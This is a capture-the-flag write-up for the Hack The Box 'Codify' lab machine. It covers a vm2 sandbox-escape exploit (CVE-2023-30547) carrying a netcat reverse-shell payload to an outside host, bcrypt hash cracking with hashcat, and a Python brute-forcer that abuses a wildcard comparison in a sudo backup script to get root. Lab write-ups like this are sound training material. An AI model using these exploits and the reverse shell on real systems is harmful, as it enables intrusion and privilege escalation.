# Codify Write-up

<img src="https://labs.hackthebox.com/storage/avatars/57b977ea744af01a5454c8643a850e59.png" width="200" height="200">

## Nmap

`nmap -sC -sV codify.htb`

    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
    |_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
    80/tcp   open  http    Apache httpd 2.4.52
    |_http-title: Codify
    |_http-server-header: Apache/2.4.52 (Ubuntu)
    3000/tcp open  http    Node.js Express framework
    |_http-title: Codify
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

## CVE-2023-30547

POC: https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244

    const { VM } = require("vm2");
    const vm = new VM();
    
    const code = `
      const err = new Error();
      err.name = {
        toString: new Proxy(() => "", {
          apply(target, thiz, args) {
            const process = args.constructor.constructor("return process")();
            throw process.mainModule.require("child_process").execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.67 4242 >/tmp/f').toString();
          },
        }),
      };
      try {
        err.stack;
      } catch (stdout) {
        stdout;
      }
    `;
    
    console.log(vm.run(code));
  
![image](https://github.com/zer00d4y/writeups/assets/128820441/443eefcf-2b11-4b7a-bd60-95a2b5aa373e)

![image](https://github.com/zer00d4y/writeups/assets/128820441/9ed111c3-69b0-4d17-9e22-034c5ff6c86e)

### Hashcat 

`echo '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2' > hash`

`hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt`  

    $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:********
                                                              
    Session..........: hashcat
    Status...........: Cracked
    Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
    Hash.Target......: $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLH.../p/Zw2
    Time.Started.....: Fri Mar 22 06:21:49 2024 (1 min, 11 secs)
    Time.Estimated...: Fri Mar 22 06:23:00 2024 (0 secs)
    Kernel.Feature...: Pure Kernel
    Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
    Guess.Queue......: 1/1 (100.00%)
    Speed.#1.........:       19 H/s (3.15ms) @ Accel:4 Loops:16 Thr:1 Vec:1
    Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
    Progress.........: 1360/14344385 (0.01%)
    Rejected.........: 0/1360 (0.00%)
    Restore.Point....: 1344/14344385 (0.01%)
    Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4080-4096
    Candidate.Engine.: Device Generator
    Candidates.#1....: teacher -> 080808
    Hardware.Mon.#1..: Util: 93%

### SSH

`ssh joshua@10.10.11.239`

Connect and get the user flag!

![image](https://github.com/zer00d4y/writeups/assets/128820441/0a5db951-fed0-4243-867c-519755b10e73)

## Privilege Escalation

![image](https://github.com/zer00d4y/writeups/assets/128820441/89d32cf5-2f31-4695-975c-c9e048207134)

`mysql-backup.sh` 

    #!/bin/bash
    DB_USER="root"
    DB_PASS=$(/usr/bin/cat /root/.creds)
    BACKUP_DIR="/var/backups/mysql"
    
    read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
    /usr/bin/echo
    
    if [[ $DB_PASS == $USER_PASS ]]; then
            /usr/bin/echo "Password confirmed!"
    else
            /usr/bin/echo "Password confirmation failed!"
            exit 1
    fi
    
    /usr/bin/mkdir -p "$BACKUP_DIR"
    
    databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")
    
    for db in $databases; do
        /usr/bin/echo "Backing up database: $db"
        /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
    done
    
    /usr/bin/echo "All databases backed up successfully!"
    /usr/bin/echo "Changing the permissions"
    /usr/bin/chown root:sys-adm "$BACKUP_DIR"
    /usr/bin/chmod 774 -R "$BACKUP_DIR"
    /usr/bin/echo 'Done!'

Brute.py

    import string
    import subprocess
    
    def check_password(p):
    	command = f"echo '{p}*' | sudo /opt/scripts/mysql-backup.sh"
    	result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    	return "Password confirmed!" in result.stdout
    
    charset = string.ascii_letters + string.digits
    password = ""
    is_password_found = False
    
    while not is_password_found:
    	for char in charset:
    		if check_password(password + char):
    			password += char
    			print(password)
    			break
    	else:
    		is_password_found = True

![image](https://github.com/zer00d4y/writeups/assets/128820441/cf9a3267-6676-4ccf-bff8-b8a01984631f)

`su root` 

`cat /root/root.txt`

![image](https://github.com/zer00d4y/writeups/assets/128820441/013efa41-3d7d-4c8f-a668-0c909b5cf9cd)



